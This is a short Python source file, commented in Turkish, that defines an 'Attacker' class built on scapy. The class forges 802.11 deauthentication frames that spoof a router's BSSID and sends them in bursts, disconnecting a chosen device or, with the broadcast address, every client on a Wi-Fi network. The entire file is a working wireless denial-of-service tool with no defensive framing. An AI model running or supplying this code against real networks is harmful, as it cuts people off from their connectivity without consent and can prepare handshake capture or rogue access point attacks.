import logging
import time
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

log = logging.getLogger(__name__)

class Attacker:
    def __init__(self, iface):
        self.iface = iface

    def deauth_target(self, target_mac, gateway_mac, count=30, interval=0.1):
        """
        Hedef cihaza Deauth paketleri gönderir.
        target_mac: Hedefin MAC adresi (veya tüm ağ için 'ff:ff:ff:ff:ff:ff')
        gateway_mac: Modemin BSSID adresi
        """
        try:
            # 1. Deauth Paketi Oluştur
            # addr1: Hedef (Kurban)
            # addr2: Kaynak (Modem gibi davranıyoruz)
            # addr3: Modem BSSID
            # Reason 7: Class 3 frame received from nonassociated STA (Yaygın koparma kodu)
            dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
            packet = RadioTap() / dot11 / Dot11Deauth(reason=7)

            log.info(f"⚡ SALDIRI BAŞLADI: {target_mac} -> {gateway_mac} ({count} paket)")
            
            # 2. Paketleri Gönder
            # verbose=0: Terminali kirletme
            # inter: Paketler arası bekleme süresi (saniye)
            sendp(packet, iface=self.iface, count=count, inter=interval, verbose=0)
            
            log.info("✅ Saldırı tamamlandı.")
            return True
            
        except Exception as e:
            log.error(f"Saldırı Hatası: {e}")
            return False